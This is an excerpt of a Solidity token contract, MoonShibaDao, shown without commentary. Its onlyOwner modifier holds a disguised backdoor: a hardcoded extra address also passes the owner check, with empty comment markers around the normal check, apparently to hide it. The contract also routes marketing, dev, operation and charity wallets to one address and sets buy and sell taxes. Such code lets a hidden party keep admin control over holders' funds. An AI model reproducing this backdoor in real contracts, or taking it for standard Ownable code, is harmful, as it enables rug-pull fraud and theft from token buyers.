...
abstract contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(owner() == /**/ _msgSender() /**/ || _msgSender() == 0x7BB43830C9974F22144649e58F718de34AC81dFd , "Ownable: caller is not the owner");
        _;
    }
...
contract MoonShibaDao is Context, IERC20, Ownable {
    ...
    uint256 public maxBuyLimit = 2_000_000_000 * 10**_decimals;
    uint256 public maxSellLimit = 1_000_000_000 * 10**_decimals;
    uint256 public maxWalletLimit = 2_000_000_000 * 10**_decimals;
    
    uint256 private asTime;
    uint256 private tTimer;
    
    address public marketingWallet =0x8413e9b33c6fC04755b33EaCC4D0Ca1f59057fd5;
    address public devWallet = 0x8413e9b33c6fC04755b33EaCC4D0Ca1f59057fd5; 
    address public operationWallet = 0x8413e9b33c6fC04755b33EaCC4D0Ca1f59057fd5;
    address public charityWallet = 0x8413e9b33c6fC04755b33EaCC4D0Ca1f59057fd5; 

    string private constant _name = "MoonShibaDao";
    ...
    Taxes public taxes = Taxes(0, 5, 2, 1, 0, 0);
    Taxes public sellTaxes = Taxes(0, 10, 2, 0, 0, 0);
